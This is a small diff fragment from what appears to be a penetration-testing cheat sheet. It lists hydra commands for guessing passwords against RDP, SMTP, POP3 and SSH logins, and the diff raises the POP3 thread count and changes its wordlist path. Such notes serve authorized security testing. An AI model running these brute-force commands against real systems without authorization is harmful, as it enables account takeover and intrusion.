@@ -11,10 +11,9 @@ hydra -t 1 -V -f -l administrator -P passwords.txt rdp://$ip
 hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V
 
 				POP3 Brute Force
-hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V
+hydra -l USERNAME -P wordlist.txt pop3://$IP -V -t 31
 
-
-				SSH
+		 		SSH
 ### Bruteforce password
 `hydra -l username -P wordlist.txt $IP ssh`
 
